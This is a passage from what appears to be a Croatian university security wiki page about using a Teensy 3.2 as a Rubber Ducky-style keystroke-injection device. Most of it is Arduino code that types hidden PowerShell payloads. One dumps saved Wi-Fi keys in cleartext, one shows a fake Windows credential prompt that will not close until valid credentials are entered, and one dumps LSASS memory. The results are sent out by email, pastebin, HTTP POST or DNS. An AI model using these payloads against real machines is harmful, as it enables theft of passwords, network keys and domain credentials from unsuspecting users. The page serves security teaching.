+<p><code>
+</p>
+<pre>    if (!digitalRead(DIP_2)) {
+          if(z2==0){
+            z2++;
+            startup();
+            Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  WLAN-Keys\" &gt;&#160;%temp%\\wl.ps1");
+            Keyboard.println("echo $user = \"vašemail\" &gt;&gt;&#160;%temp%\\wl.ps1");
+            Keyboard.println("echo $pass = \"vašašifra\" &gt;&gt;&#160;%temp%\\wl.ps1");
+            Keyboard.println("echo $dev = \"INPUT3\" &gt;&gt;&#160;%temp%\\wl.ps1");
+            Keyboard.println("echo $w = netsh wlan show profiles ^| Select-String -Pattern \"All User Profile\" ^| foreach {$_.ToString()} &gt;&gt;&#160;%temp%\\wl.ps1");
+            Keyboard.println("echo $ed = $w ^| foreach {$_.Replace(\"    All User Profile    &#160;: \",$null)} &gt;&gt;&#160;%temp%\\wl.ps1");
+            Keyboard.println("echo $pv = $ed ^| foreach {netsh wlan show profiles name=\"$_\" key=clear} &gt;&gt;&#160;%temp%\\wl.ps1");
+            showout("wl");
+            Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") &gt;&#160;%temp%\\wl.vbs");
+            Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c&#160;%temp%\\wl.ps1\"),0,true &gt;&gt;&#160;%temp%\\wl.vbs");
+            delay(1000);
+            Keyboard.println("wscript&#160;%temp%\\wl.vbs");
+            delay(1000);
+            Keyboard.println("exit");
+            }}//
+</pre>
+<p></code>
+</p><p>Kao što vidimo, dobivamo vrlo detaljan ispis WLAN profila sa metinog računala. Spominju se sljedeće stavke: Applied, Version, Type, Name, Control Options, Connection mode, Network broadcast, AutoSwitch, Connectivity settings, Number of SSIDs, SSID name, Network type, Radio type, Vendor extensions, Security settings, Authentication, Cipher, Security key, Key Index, Cost settings, Cost, Congested, Approaching Data Limit, Over Data Limit, Roaming, Cost Source. Dobivamo vrlo detaljan uvid u korisnikovo ponašanje prema svim profilima koje ima, njegove "navike" i slične sitnice kojima možemo otkriti dosta ranjivosti i predvidjeti ponašanja korisnika.
+</p><p>Sljedeći isječak koda reagira na pin 5 i plasira korisniku lažni prozor koji se ne gasi dok se ne unesu username i password koji odgovaraju tom računalu.
+</p>
+<div class="thumb tright"><div class="thumbinner" style="width:602px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss5.png" class="image"><img alt="" src="../../images/thumb/d/d5/Ss5.png/600px-Ss5.png" width="600" height="444" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss5.png" class="internal" title="Povećaj"><img src="../../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>Lažni prozor koji traži kredencijale korisnika - username i password</div></div></div>
+<p><code>
+</p>
+<pre>    if (!digitalRead(DIP_3)) {
+          if(z3==0){
+            z3++;
+            startup();
+            Keyboard.println("echo $ErrorActionPreference=\"SilentlyContinue\" &gt;&#160;%temp%\\cr.ps1");
+            Keyboard.println("echo $user = \"vašemail\" &gt;&gt;&#160;%temp%\\cr.ps1");
+            Keyboard.println("echo $pass = \"vašašifra\" &gt;&gt;&#160;%temp%\\cr.ps1");
+            Keyboard.println("echo $dev = \"INPUT3\" &gt;&gt;&#160;%temp%\\cr.ps1");
+            Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  Credentials\" &gt;&gt;&#160;%temp%\\cr.ps1");
+            Keyboard.println("echo Add-Type -assemblyname system.DirectoryServices.accountmanagement  &gt;&gt;&#160;%temp%\\cr.ps1");
+            Keyboard.println("echo $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext(  //nastavak linije ispod
+            [System.DirectoryServices.AccountManagement.ContextType]::Machine) &gt;&gt;&#160;%temp%\\cr.ps1");
+            Keyboard.println("echo $dn = \"LDAP://\" + ([ADSI]\"\").distinguishedName &gt;&gt;&#160;%temp%\\cr.ps1");
+            Keyboard.println("echo while(1){ &gt;&gt;&#160;%temp%\\cr.ps1");
+            Keyboard.println("echo $cr = $host.ui.PromptForCredential(\"Need credentials\", \"Please enter your user name and password.\", \"\", \"\") &gt;&gt;&#160;%temp%\\cr.ps1");
+            Keyboard.println("echo if($cr){ &gt;&gt;&#160;%temp%\\cr.ps1");
+            Keyboard.println("echo $creds = $cr.GetNetworkCredential() &gt;&gt;&#160;%temp%\\cr.ps1");
+            Keyboard.println("echo [String]$u = $creds.username &gt;&gt;&#160;%temp%\\cr.ps1");
+            Keyboard.println("echo [String]$p = $creds.password &gt;&gt;&#160;%temp%\\cr.ps1");
+            Keyboard.println("echo [String]$domain = $creds.domain &gt;&gt;&#160;%temp%\\cr.ps1");
+            Keyboard.println("echo $al = $DS.ValidateCredentials($u, $p) &gt;&gt;&#160;%temp%\\cr.ps1");
+            Keyboard.println("echo $ad = New-Object System.DirectoryServices.DirectoryEntry($dn,$u,$p) &gt;&gt;&#160;%temp%\\cr.ps1");
+            Keyboard.println("echo if(($al -eq $true) -or ($ad.name -ne $null)){ &gt;&gt;&#160;%temp%\\cr.ps1");
+            Keyboard.println("echo $pv = \"Username: \" + $u + \" Password: \" + $p + \" Domain:\" + $domain &gt;&gt;&#160;%temp%\\cr.ps1");
+            Keyboard.println("echo break}}} &gt;&gt;&#160;%temp%\\cr.ps1");
+            showout("cr");
+            Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") &gt;&#160;%temp%\\cr.vbs");
+            Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c&#160;%temp%\\cr.ps1\"),0,true &gt;&gt;&#160;%temp%\\cr.vbs");
+            delay(1000);
+            Keyboard.println("wscript&#160;%temp%\\cr.vbs");
+            delay(1000);
+            Keyboard.println("exit");
+            }
+          } 
+</pre>
+<p></code>
+</p><p>Nakon pravilnog i točnog ispunjavnja ove forme od "Windowsa", automatski se prosljeđuje na email koji ste odabrali, ili nekim drugim kanalom (ftp server, nešto treće..)
+</p><p>Posljednja opcija ovog Teensyja je memory dump. Kod generira .dmp file kojeg valja otvoriti nekim alatom te se u njemu nalaze različite stvari iz računala. Kod izgleda ovako&#160;:
+</p>
+<div class="thumb tright"><div class="thumbinner" style="width:313px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss6.png" class="image"><img alt="" src="../../images/b/be/Ss6.png" width="311" height="276" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss6.png" class="internal" title="Povećaj"><img src="../../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>.dmp file generiran iz koda, prepun informacija</div></div></div>
+<p><code>
+</p>
+<pre>    if (!digitalRead(DIP_4)) {
+          if(z4==0){
+            z4++;
+            startup();
+            Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  Memory dump\" &gt;&#160;%temp%\\mdmp.ps1");
+            Keyboard.println("echo $user = \"vas_email\" &gt;&gt;&#160;%temp%\\mdmp.ps1");
+            Keyboard.println("echo $pass = \"vasa_sifra\" &gt;&gt;&#160;%temp%\\mdmp.ps1");
+            Keyboard.println("echo $dev = \"INPUT3\" &gt;&gt;&#160;%temp%\\mdmp.ps1");
+            Keyboard.println("echo $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting') &gt;&gt;&#160;%temp%\\mdmp.ps1");
+            Keyboard.println("echo $WERNM = $WER.GetNestedType('NativeMethods', 'NonPublic') &gt;&gt;&#160;%temp%\\mdmp.ps1");
+            Keyboard.println("echo $Flags = [Reflection.BindingFlags] 'NonPublic, Static' &gt;&gt;&#160;%temp%\\mdmp.ps1");
+            Keyboard.println("echo $MDW = $WERNM.GetMethod('MiniDumpWriteDump', $Flags) &gt;&gt;&#160;%temp%\\mdmp.ps1");
+            Keyboard.println("echo $MDF = [UInt32] 2 &gt;&gt;&#160;%temp%\\mdmp.ps1");
+            Keyboard.println("echo $PrI = Get-Process \"lsass\" &gt;&gt;&#160;%temp%\\mdmp.ps1");
+            Keyboard.println("echo $PrN = $PrI.ProcessName &gt;&gt;&#160;%temp%\\mdmp.ps1");
+            Keyboard.println("echo $PrH = $PrI.Handle &gt;&gt;&#160;%temp%\\mdmp.ps1");
+            Keyboard.println("echo $FSt = New-Object IO.FileStream(\"$env:temp\\$PrN.dmp\", [IO.FileMode]::Create) &gt;&gt;&#160;%temp%\\mdmp.ps1");
+            Keyboard.println("echo $Result = $MDW.Invoke($null, @($PrH,$ProcessId,$FSt.SafeFileHandle,$MDF,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero)) &gt;&gt;&#160;%temp%\\mdmp.ps1");
+            Keyboard.println("echo $FSt.Close() &gt;&gt;&#160;%temp%\\mdmp.ps1");
+            delay(1000);
+            String fn = "mdmp";
+            String fp = "$env:temp\\$PrN.dmp";
+             if ("gmail" == "pastebin")
+            {
+              pastebin(fn);
+            }
+            else if ("gmail" == "gmail")
+            {
+              if (fp&#160;!= "")
+              {
+                  gmail(fn,fp);
+              }
+              else
+              {
+                  gmail(fn,"no");
+              }
+            }
+            else if ("gmail" == "post")
+            {
+              hpost(fn);
+            }
+            else if ("gmail" == "dns")
+            {
+              dns(fn);
+            }
+            Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") &gt;&#160;%temp%\\mdmp.vbs");
+            Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c&#160;%temp%\\mdmp.ps1\"),0,true &gt;&gt;&#160;%temp%\\mdmp.vbs");
+            delay(1000);
+            Keyboard.println("wscript&#160;%temp%\\mdmp.vbs");
+            delay(3000);
+          
+            Keyboard.println("exit");
+            
+            }}
+</pre>
+<p></code>
+</p><p><br />
+</p>
+<hr />
+<p><br />
+</p>
+<h2> <span class="mw-headline" id="Zaklju.C4.8Dak"> Zaključak </span></h2>
+<p>Teensy 3.2 je vrlo moćan alat u kombinaciji sa kvalitetnim kodom. Tehnički gledano - zaštite od toga nema, postoje nekakvi "čepovi" za usb portove, ali realno - tko to posjeduje? Kautilya također vrlo moćna ruby skripta, lako se s njom radi i posjeduje dosta opcija za kvalitetan napad. Zaključak je taj da nitko nije siguran, a Teensy je vrlo praktičan uređaj koji, ako dođe u vješte ruke, može napraviti mnogo štete, na ovaj ili onaj način.
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="Literatura"> Literatura </span></h2>
+<ol>
+<li><a href="http://www.irongeek.com/i.php?page=security/programmable-hid-usb-keystroke-dongle#Programming_examples_and_my_PHUKD_library" class="external free" rel="nofollow">http://www.irongeek.com/i.php?page=security/programmable-hid-usb-keystroke-dongle#Programming_examples_and_my_PHUKD_library</a></li>
+<li><a href="http://forum.top-hat-sec.com/index.php?topic=5503.0" class="external free" rel="nofollow">http://forum.top-hat-sec.com/index.php?topic=5503.0</a></li>
+<li><a href="http://bundler.io/" class="external free" rel="nofollow">http://bundler.io/</a></li>
+<li><a href="https://gorails.com/setup/ubuntu/14.04" class="external free" rel="nofollow">https://gorails.com/setup/ubuntu/14.04</a></li>
+<li><a href="https://github.com/tkisason/Kautilya" class="external free" rel="nofollow">https://github.com/tkisason/Kautilya</a></li>
+<li><a href="https://forums.hak5.org/index.php?/topic/34172-badusb-vs-rubber-ducky/" class="external free" rel="nofollow">https://forums.hak5.org/index.php?/topic/34172-badusb-vs-rubber-ducky/</a></li>
+<li><a href="https://www.youtube.com/watch?v=g_ecnM7ULDw&amp;t=22s" class="external free" rel="nofollow">https://www.youtube.com/watch?v=g_ecnM7ULDw&amp;t=22s</a></li>
+</ol>
+
+<!-- 
+NewPP limit report
+Preprocessor node count: 23/1000000
+Post-expand include size: 0/2097152 bytes
+Template argument size: 0/2097152 bytes
+Expensive parser function count: 0/100
+-->
+
+<!-- Saved in parser cache with key sisds:pcache:idhash:9575-0!*!0!!hr!2!edit=0 and timestamp 20190203204158 -->
+<div class="printfooter">
+Dobavljeno iz "<a href="Rubberducky_clone).html">http://security.foi.hr/wiki/index.php/Teensy_3.2_(the_Glitch/Rubberducky_clone)</a>"</div>
+				<!-- /bodytext -->
+								<!-- catlinks -->
+				<div id='catlinks' class='catlinks catlinks-allhidden'></div>				<!-- /catlinks -->
+												<div class="visualClear"></div>
+			</div>
+			<!-- /bodyContent -->
+		</div>
+		<!-- /content -->
+		<!-- header -->
+		<div id="mw-head" class="noprint">
+			
+<!-- 0 -->
+<div id="p-personal" class="">
+	<h5>Osobni alati</h5>
+	<ul>
+					<li  id="pt-login"><a href="http://security.foi.hr/wiki/index.php?title=Posebno:Prijava&amp;returnto=Teensy_3.2_(the_Glitch/Rubberducky_clone)" title="Predlažemo Vam da se prijavite, ali nije obvezno. [o]" accesskey="o">Prijavi se</a></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+			<div id="left-navigation">
+				
+<!-- 0 -->
+<div id="p-namespaces" class="vectorTabs">
+	<h5>Imenski prostori</h5>
+	<ul>
+					<li  id="ca-nstab-main" class="selected"><span><a href="Rubberducky_clone).html"  title="Pogledaj sadržaj [c]" accesskey="c">Članak</a></span></li>
+					<li  id="ca-talk" class="new"><span><a href="http://security.foi.hr/wiki/index.php?title=Razgovor:Teensy_3.2_(the_Glitch/Rubberducky_clone)&amp;action=edit&amp;redlink=1"  title="Razgovor o stranici [t]" accesskey="t">Razgovor</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-variants" class="vectorMenu emptyPortlet">
+		<h5><span>Inačice</span><a href="Rubberducky_clone).html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+			</div>
+			<div id="right-navigation">
+				
+<!-- 0 -->
+<div id="p-views" class="vectorTabs">
+	<h5>Pogledi</h5>
+	<ul>
+					<li id="ca-view" class="selected"><span><a href="Rubberducky_clone).html" >Čitaj</a></span></li>
+					<li id="ca-viewsource"><span><a href="http://security.foi.hr/wiki/index.php?title=Teensy_3.2_(the_Glitch/Rubberducky_clone)&amp;action=edit"  title="Ova stranica je zaštićena. Možete pogledati izvorni kod. [e]" accesskey="e">Vidi izvor</a></span></li>
+					<li id="ca-history" class="collapsible "><span><a href="http://security.foi.hr/wiki/index.php?title=Teensy_3.2_(the_Glitch/Rubberducky_clone)&amp;action=history"  title="Ranije izmjene na ovoj stranici. [h]" accesskey="h">Vidi stare izmjene</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-cactions" class="vectorMenu emptyPortlet">
+	<h5><span>Radnje</span><a href="Rubberducky_clone).html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+
+<!-- 2 -->
+<div id="p-search">
+	<h5><label for="searchInput">Traži</label></h5>
+	<form action="http://security.foi.hr/wiki/index.php" id="searchform">
+		<input type='hidden' name="title" value="Posebno:Traži"/>
+				<input id="searchInput" name="search" type="text"  title="Pretraži ovaj wiki [f]" accesskey="f"  value="" />
+		<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Kreni" title="Idi na stranicu s ovim imenom ako ona postoji" />
+		<input type="submit" name="fulltext" class="searchButton" id="mw-searchButton" value="Traži" title="Traži ovaj tekst na svim stranicama" />
+			</form>
+</div>
+
+<!-- /2 -->
+			</div>
+		</div>
+		<!-- /header -->
+		<!-- panel -->
+			<div id="mw-panel" class="noprint">
+				<!-- logo -->
+					<div id="p-logo"><a style="background-image: url(../../../images/osslogo.png);" href="../../../wiki.html"  title="Glavna stranica"></a></div>
+				<!-- /logo -->
+				
+<!-- navigation -->
+<div class="portal" id='p-navigation'>
+	<h5>Orijentacija</h5>
+	<div class="body">
+				<ul>
+					<li id="n-mainpage-description"><a href="../../../wiki.html" title="Posjeti glavnu stranicu [z]" accesskey="z">Glavna stranica</a></li>
+					<li id="n-portal"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Portal_zajednice" title="O projektu, što možete učiniti, gdje je što">Portal zajednice</a></li>
+					<li id="n-currentevents"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Novosti" title="O trenutačnim događajima">Aktualno</a></li>
+					<li id="n-recentchanges"><a href="../Posebno:Nedavne_promjene.html" title="Popis nedavnih promjena u wikiju. [r]" accesskey="r">Nedavne promjene</a></li>
+					<li id="n-randompage"><a href="../Posebno:Slučajna_stranica.html" title="Učitaj slučajnu stranicu [x]" accesskey="x">Slučajna stranica</a></li>
+					<li id="n-help"><a href="../Pomoć:Pomoć.html" title="Mjesto za pomoć suradnicima.">Pomoć</a></li>
+				</ul>
+			</div>
+</div>
+
+<!-- /navigation -->
+
+<!-- SEARCH -->
+
+<!-- /SEARCH -->
+
+<!-- TOOLBOX -->
+<div class="portal" id="p-tb">
+	<h5>Traka s alatima</h5>
+	<div class="body">
+		<ul>
+					<li id="t-whatlinkshere"><a href="http://security.foi.hr/wiki/index.php/Posebno:%C5%A0to_vodi_ovamo/Teensy_3.2_(the_Glitch/Rubberducky_clone)" title="Popis svih stranica koje sadrže poveznice ovamo [j]" accesskey="j">Što vodi ovamo</a></li>
+						<li id="t-recentchangeslinked"><a href="http://security.foi.hr/wiki/index.php/Posebno:Povezane_promjene/Teensy_3.2_(the_Glitch/Rubberducky_clone)" title="Nedavne promjene na stranicama na koje vode ovdašnje poveznice [k]" accesskey="k">Povezane stranice</a></li>
+																																										<li id="t-specialpages"><a href="../Posebno:Posebne_stranice.html" title="Popis posebnih stranica [q]" accesskey="q">Posebne stranice</a></li>
+									<li id="t-print"><a href="http://security.foi.hr/wiki/index.php?title=Teensy_3.2_(the_Glitch/Rubberducky_clone)&amp;printable=yes" rel="alternate" title="Verzija za ispis ove stranice [p]" accesskey="p">Verzija za ispis</a></li>
+						<li id="t-permalink"><a href="http://security.foi.hr/wiki/index.php?title=Teensy_3.2_(the_Glitch/Rubberducky_clone)&amp;oldid=40297" title="Trajna poveznica na ovu verziju stranice">Trajna poveznica</a></li>
+						</ul>
+	</div>
+</div>
+
+<!-- /TOOLBOX -->
+
+<!-- LANGUAGES -->
+
+<!-- /LANGUAGES -->
+			</div>
+		<!-- /panel -->
+		<!-- footer -->
+		<div id="footer">
+											<ul id="footer-info">
+																	<li id="footer-info-lastmod"> Datum zadnje promjene na ovoj stranici: 11:35, 16. siječnja 2017.</li>
+																							<li id="footer-info-viewcount">Ova stranica je pogledana 235 puta.</li>
+																							<li id="footer-info-copyright">Sadržaji se koriste u skladu s <a href="http://creativecommons.org/licenses/by-sa/3.0/" class="external ">Creative Commons Attribution Share Alike</a>.</li>
+															</ul>
+															<ul id="footer-places">
+																	<li id="footer-places-privacy"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Za%C5%A1tita_privatnosti" title="SIS Wiki:Zaštita privatnosti">Zaštita privatnosti</a></li>
+																							<li id="footer-places-about"><a href="../SIS_Wiki:O_projektu_SIS_Wiki.html" title="SIS Wiki:O projektu SIS Wiki">O projektu SIS Wiki</a></li>
+																							<li id="footer-places-disclaimer"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:General_disclaimer" title="SIS Wiki:General disclaimer">Odricanje od odgovornosti</a></li>
+															</ul>
+											<ul id="footer-icons" class="noprint">
+					<li id="footer-copyrightico">
+						<a href="http://creativecommons.org/licenses/by-sa/3.0/"><img src="../../skins/common/images/cc-by-sa.png" alt="Creative Commons Attribution Share Alike" width="88" height="31" /></a>
+					</li>
+					<li id="footer-poweredbyico">
+						<a href="http://www.mediawiki.org/"><img src="../../skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
+					</li>
+				</ul>
+						<div style="clear:both"></div>
+		</div>
+		<!-- /footer -->
+		
+<script src="../../load.php%3Fdebug=false&amp;lang=hr&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Teensy_3.2_(the_Glitch/Rubberducky_clone)", "wgTitle": "Teensy 3.2 (the Glitch/Rubberducky clone)", "wgAction": "view", "wgArticleId": 9575, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 40297, "wgCategories": [], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
+}
+</script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
+	mediaWiki.loader.go();
+}
+</script>
+
+<script>if ( window.mediaWiki ) {
+	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"vector","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
+	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"hr","language":"hr","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
+}
+</script>		<!-- fixalpha -->
+		<script type="text/javascript"> if ( window.isMSIE55 ) fixalpha(); </script>
+		<!-- /fixalpha -->
+		<!-- Served in 0.386 secs. -->			</body>
+</html>
